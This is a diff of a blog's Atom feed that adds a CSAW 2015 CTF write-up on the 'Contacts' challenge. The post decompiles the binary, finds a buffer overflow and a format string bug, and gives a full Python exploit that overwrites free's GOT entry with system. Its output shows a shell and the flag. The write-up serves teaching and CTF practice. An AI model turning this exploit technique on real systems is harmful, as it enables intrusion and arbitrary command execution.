@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Fmt | GeeksSpeak Team Blog]]></title>
   <link href="http://geeksspeak.github.io/blog/categories/fmt/atom.xml" rel="self"/>
   <link href="http://geeksspeak.github.io/"/>
-  <updated>2015-05-20T00:44:41+04:30</updated>
+  <updated>2015-09-21T17:50:10+04:30</updated>
   <id>http://geeksspeak.github.io/</id>
   <author>
     <name><![CDATA[GeeksSpeak]]></name>
@@ -12,6 +12,305 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[CSAW 2015 - PWN250 - Contacts]]></title>
+    <link href="http://geeksspeak.github.io/blog/2015/09/21/csaw-2015-pwn250-contacts/"/>
+    <updated>2015-09-21T17:43:52+04:30</updated>
+    <id>http://geeksspeak.github.io/blog/2015/09/21/csaw-2015-pwn250-contacts</id>
+    <content type="html"><![CDATA[<p><strong>CSAW 2015 contacts Writeup</strong><br/>
+<strong>Point = 250</strong><br/>
+<strong>Category = Exploitable</strong></p>
+
+<p>Hi,</p>
+
+<p>we are given a binary <code>contacts</code>,</p>
+
+<pre><code>hamidx9@KernelsCallMe:~/ctf/csaw/pwn/100$ file contacts
+contacts: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=a2c73697f9555c6be6c57478029e352df1f28cc8, stripped
+</code></pre>
+
+<p>The binary seems to be a contact manager, based on my analysis it has a buffer at <code>BSS</code>, and every time we create a contact this structure will be located at the buffer:</p>
+
+<pre><code>struct contact {
+    char *desc;
+    char *num;
+    char name[64];
+    unsigned int desc_length;
+    int enabled;
+};
+</code></pre>
+
+<p><code>desc</code> is the contacs description and allocates a buffer with buffer size <code>des_length</code>. <code>num</code> is the contact number with size <code>0xb</code>.</p>
+
+<p>So, we are going to find vulnerabilities.</p>
+
+<p>I named <code>0x08048980</code> => <code>editCon</code>, this function edites the contact which you give its name, let&rsquo;s check the decompilation:</p>
+
+<pre><code>int __cdecl editCon(int a1)
+{
+  int n; // [sp+1Ch] [bp-5Ch]@6
+  int v3; // [sp+20h] [bp-58h]@5
+  int v4; // [sp+24h] [bp-54h]@1
+  int v5; // [sp+28h] [bp-50h]@3
+  char s; // [sp+2Ch] [bp-4Ch]@1
+  int v7; // [sp+6Ch] [bp-Ch]@1
+
+  v7 = *MK_FP(__GS__, 20);
+  v4 = a1;
+  printf("Name to change? ");
+  fgets(&amp;s, 64, stdin);
+  if ( strchr(&amp;s, 10) )
+    *strchr(&amp;s, 10) = 0;
+  v5 = 0;
+  while ( 1 )
+  {
+    if ( v5 &gt; 9 )
+    {
+      puts("Name not found");
+      return *MK_FP(__GS__, 20) ^ v7;
+    }
+    if ( !strcmp(&amp;s, (v4 + 8)) )
+      break;
+    ++v5;
+    v4 += 80;
+  }
+  printf("1.Change name\n2.Change description\n&gt;&gt;&gt; ");
+  __isoc99_scanf("%u%*c", &amp;v3);
+  if ( v3 == 1 )
+  {
+    printf("New name: ");
+    fgets((v4 + 8), n, stdin);
+    if ( strchr((v4 + 8), 10) )
+      *strchr((v4 + 8), 10) = 0;
+  }
+  else if ( v3 == 2 )
+  {
+    free(*v4);
+    printf("Length of description: ");
+    __isoc99_scanf("%u%*c", &amp;n);
+    printf("Description: \n\t");
+    *v4 = malloc(n);
+    fgets(*v4, n, stdin);
+  }
+  else
+  {
+    puts("Bad option");
+  }
+  return *MK_FP(__GS__, 20) ^ v7;
+</code></pre>
+
+<p>As you may noticed when i try to edit the name there is no input length check a buffer overflow vulnerability. but there may be a problem since we don&rsquo;t know it&rsquo;s value <code>n</code>.
+this can be fixed by first preparing a description edit, so after entering the function again we have a known size.</p>
+
+<p>and after some diging we can notice there is an another vulnerability,  <code>0x08048bd1</code> => pCon:</p>
+
+<pre><code>int __cdecl pCon(int a1, int a2, int a3, char *format)
+{
+  printf("\tName: %s\n", a1);
+  printf("\tLength %u\n", a2);
+  printf("\tPhone #: %s\n", a3);
+  printf("\tDescription: ");
+  return printf(format);
+}
+</code></pre>
+
+<p>Here we go, a nice format string vulnerability.</p>
+
+<p>by using these two vulnerabilites we have write-what-where primitive to exploit the binary.</p>
+
+<p>this is my scenario,</p>
+
+<ol>
+<li>create a contact.</li>
+<li>leak a pointer to locate the <code>system</code> symbol using fmt vuln.</li>
+<li>create second contact.</li>
+<li>leak second contact decription heap address to have a stable exploitation using fmt vuln.</li>
+<li>create third contact.</li>
+<li>leak third contact decription heap address to have a stable exploitation using fmt vuln.</li>
+<li>Overflow first contact name into the second and use proper description address which leaked before
+ and overwrite number pointer to heap by <code>free</code> got address.</li>
+<li>Overflow second contact name into the third and use proper description address which leaked before
+ and overwrite number pointer to heap by <code>free+2</code> got address.</li>
+<li>Edit second and third contacts description to <code>%####x%1$hn</code> and proper number to overwrite <code>free</code> to <code>system</code></li>
+<li>Edit first contact description to &lsquo;/bin/sh\x00&rsquo;</li>
+<li>delete first contact and pop a shell.</li>
+</ol>
+
+
+<p>Of course null byte is not our concern since fgets is used in reading procedure.</p>
+
+<p><strong> please notice i used <code>precision</code> task libc version </strong> but you can use libc_database to find a proper one blindly.</p>
+
+<p>I should declare there maybe another or better solution but this let me in ;)</p>
+
+<p>and finally out exploit:</p>
+
+<pre><code>#!/usr/bin/python
+
+
+import telnetlib
+import struct
+import socket
+import re
+import time
+from hexdump import hexdump
+import pdb
+
+#system_offset = 0x22a32 # local - ubuntu 15.04 - libc6-2.21-0ubuntu4
+system_offset = 0x2670d # Remote -  ubuntu 14.04.2 - libc6_2.19-0ubuntu6.
+
+def readuntil(f, delim='&gt;&gt;&gt; '):
+    data = ''
+    while not data.endswith(delim):
+        c = f.read(1)
+        assert len(c) &gt; 0
+        data += c
+    #print data
+    return data
+
+def p(v):
+    return struct.pack('&lt;Q', v)
+
+def u(v):
+    return struct.unpack('&lt;Q', v)[0]
+
+
+
+def create_c(f, n, num, l, desc):
+    print "[+] Create Contact"
+    f.write("1\n")
+    readuntil(f, 'Name: ')
+    f.write(n+"\n")
+    readuntil(f, ' No: ')
+    f.write(num+"\n")
+    readuntil(f, 'of description: ')
+    f.write(str(l)+"\n")
+    readuntil(f, 'Enter description:\n\t\t')
+    f.write(desc+"\n")
+    #print "MM", f.read(1024)
+    readuntil(f)
+
+
+def edit_con_nameon_desc(f, n, l, v):
+    print "[+] Edit Contact"
+    f.write("3\n")
+    readuntil(f, 'change? ')
+    f.write(n+"\n")
+    readuntil(f)
+    f.write("2\n")
+    readuntil(f, 'description: ')
+    f.write(str(l)+"\n")
+    readuntil(f, 'Description: ')
+    f.write(v+"\n")
+    readuntil(f)
+
+def edit_con_name(f, n, v):
+    print "[+] Edit Contact"
+    f.write("3\n")
+    readuntil(f, 'change? ')
+    f.write(n+"\n")
+    readuntil(f)
+    f.write("1\n")
+    readuntil(f, 'name: ')
+    f.write(v+"\n")
+    readuntil(f)
+
+def print_c(f):
+    print "[+] Print Contact"
+    f.write("4\n")
+    return readuntil(f)
+
+def delete_c(f, n):
+    print "[+] Delete Contact"
+    f.write("2\n")
+    readuntil(f, 'remove? ')
+    f.write(n+"\n")
+
+s = socket.socket()
+
+#s.connect(("54.165.223.128", 2555))
+s.connect(("127.0.0.1", 1337))
+
+f = s.makefile('rw', bufsize=0)
+
+readuntil(f)
+
+raw_input("$")
+
+#pdb.set_trace()
+create_c(f, "AA", "123123", 200, "%31$p\n")
+pr = print_c(f)
+address = int(re.search(r'\tDescription: 0x(\S+)', pr).group(1), 16)
+print "[+] address = ", hex(address)
+system_offset += address
+print "[+] system address = ", hex(system_offset)
+edit_con_nameon_desc(f, "AA", 200, "/bin/sh\x00")
+create_c(f, "BB", "123123", 200, "%1$p\n")
+pr = print_c(f)
+heap_addr = int(re.search(r'\tDescription: 0x(\S+)', pr).group(1), 16)
+print "[+] address = ", hex(heap_addr)
+heap_addr += 0x10
+
+edit_con_nameon_desc(f, "BB", 200, "BBB")
+
+create_c(f, "CC", "123123", 200, "%1$p\n")
+pr = print_c(f)
+heap_addr_c = int(re.search(r'\tDescription: 0x(\S+)', pr).group(1), 16)
+print "[+] address = ", hex(heap_addr_c)
+heap_addr_c += 0x10
+
+edit_con_nameon_desc(f, "CC", 200, "CCC")
+
+edit_con_name(f, "AA", "AA\x00"+"A"*61+struct.pack("&lt;I", 0xc8)+struct.pack("&lt;I", 0x1)+struct.pack("&lt;I", heap_addr) + struct.pack("&lt;I", 0x0804b014) + "BB\x00\n")
+
+edit_con_name(f, "BB", "BB\x00"+"B"*61+struct.pack("&lt;I", 0xc8)+struct.pack("&lt;I", 0x1)+struct.pack("&lt;I", heap_addr_c) + struct.pack("&lt;I", 0x0804b016) + "CC\x00\n")
+
+
+edit_con_nameon_desc(f, "BB", 200, "%{}x%1$hn".format(system_offset &amp; 0xffff))
+edit_con_nameon_desc(f, "CC", 200, "%{}x%1$hn".format((system_offset &gt;&gt; 16) &amp; 0xffff))
+print_c(f)
+
+delete_c(f, "AA")
+
+t = telnetlib.Telnet()
+t.sock = s
+t.interact()
+
+
+s.close()
+</code></pre>
+
+<p>And running the expl:</p>
+
+<pre><code>hamidx9@KernelsCallMe:~/ctf/csaw/pwn/100$ python sol.py 
+$
+[+] Create Contact
+[+] Print Contact
+[+] address =  0xf75a9a83
+[+] system address =  0xf75d0190
+[+] Edit Contact
+[+] Create Contact
+[+] Print Contact
+[+] address =  0x9ea10e8
+[+] Edit Contact
+[+] Create Contact
+[+] Print Contact
+[+] address =  0x9ea11c8
+[+] Edit Contact
+[+] Edit Contact
+[+] Edit Contact
+[+] Edit Contact
+[+] Edit Contact
+[+] Print Contact
+[+] Delete Contact
+cat flag
+flag{f0rm47_s7r1ng5_4r3_fun_57uff}
+</code></pre>
+
+<p>@HAMIDx9</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[DefConCTF 2015 Quals - Babyecho Writeup]]></title>
